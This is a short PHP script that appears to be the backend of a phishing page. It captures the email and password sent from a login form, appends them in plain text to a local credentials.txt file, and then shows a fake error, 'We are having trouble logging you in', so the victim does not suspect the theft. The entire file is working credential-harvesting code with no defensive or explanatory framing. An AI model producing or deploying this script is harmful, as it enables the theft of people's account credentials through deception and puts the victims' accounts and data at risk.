<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $pass = $_POST['pass'];

    // Validate that the email and password are not empty
    if (!empty($email) && !empty($pass)) {
        // Save the credentials to a file
        $file = 'credentials.txt';
        file_put_contents($file, "Email: " . $email . " Password: " . $pass . "\n", FILE_APPEND | LOCK_EX);

       // Display a JavaScript alert message
       echo "<script>alert('We are having trouble logging you in. Please try again later.');</script>";
    } else {
        echo "<script>alert('Email and Password cannot be empty.');</script>";
    }
} else {
    echo "<script>alert('Enter Login Credentials.');</script>";
}
?>